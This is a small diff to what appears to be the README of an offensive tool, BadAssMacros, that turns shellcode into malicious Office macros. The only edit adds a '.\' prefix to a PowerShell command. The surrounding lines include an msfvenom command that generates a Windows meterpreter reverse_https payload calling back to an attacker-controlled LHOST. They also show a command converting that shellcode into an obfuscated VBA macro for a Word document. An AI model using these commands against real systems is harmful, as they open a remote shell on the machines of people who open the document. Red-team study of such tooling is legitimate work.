@@ -225,5 +225,5 @@ The following command provides some sane defaults that will generate the raw tex
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.x.y LPORT=443 EXITFUNC=thread -f vbapplication > shellcode.txt
 ```
 ```powershell
-BadAssMacrosx86.exe -i shellcode.txt -w doc -p no -s indirect -c 10 -o macro.txt
+.\BadAssMacrosx86.exe -i shellcode.txt -w doc -p no -s indirect -c 10 -o macro.txt
 ```
